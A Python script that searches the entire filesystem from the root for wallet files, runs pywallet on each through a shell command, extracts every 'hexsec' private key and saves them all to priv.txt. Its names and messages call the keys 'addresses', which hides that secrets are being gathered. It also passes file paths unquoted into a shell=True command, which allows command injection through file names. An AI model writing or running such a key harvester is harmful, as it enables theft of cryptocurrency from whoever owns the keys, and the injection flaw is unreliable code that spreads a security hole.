import os

import subprocess

import regex
import json
import re



def extract_wallet_addresses(wallet_file_path):

    cmd = f"python pywallet.py -d --dont_check_walletversion --dumpformat=json -w {wallet_file_path}"

    result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    decoded_stdout = result.stdout.decode('utf-8', errors='replace')



    hexsec_values = set()

    hexsec_pattern = re.compile(r'"hexsec":\s*"([^"]+)"')



    for line in decoded_stdout.split('\n'):

        match = hexsec_pattern.search(line)

        if match:

            hexsec_values.add(match.group(1))



    return hexsec_values



def traverse_folders_and_extract_addresses(start_directory, output_file):

    all_addresses = set()

    

    for root, _, files in os.walk(start_directory):

        for file in files:

            file_name, file_extension = os.path.splitext(file.lower())

            if file_name == 'wallet' and file_extension:

                wallet_path = os.path.join(root, file)

                print(f'Processing file: {wallet_path}')

                try:

                    addresses = extract_wallet_addresses(wallet_path)

                    all_addresses.update(addresses)

                    save_addresses_to_file(all_addresses, output_file)

                except Exception as e:

                    print(f'Error processing file {wallet_path}: {e}')

    

    return all_addresses


def save_addresses_to_file(addresses, output_file):

    with open(output_file, 'w') as file:

        for address in addresses:

            file.write(f'{address}\n')



if __name__ == '__main__':

    starting_directory = '/'

    output_file_path = 'priv.txt'



    extracted_addresses = traverse_folders_and_extract_addresses(starting_directory, output_file_path)



    print(f'All used addresses have been saved to {output_file_path}.')
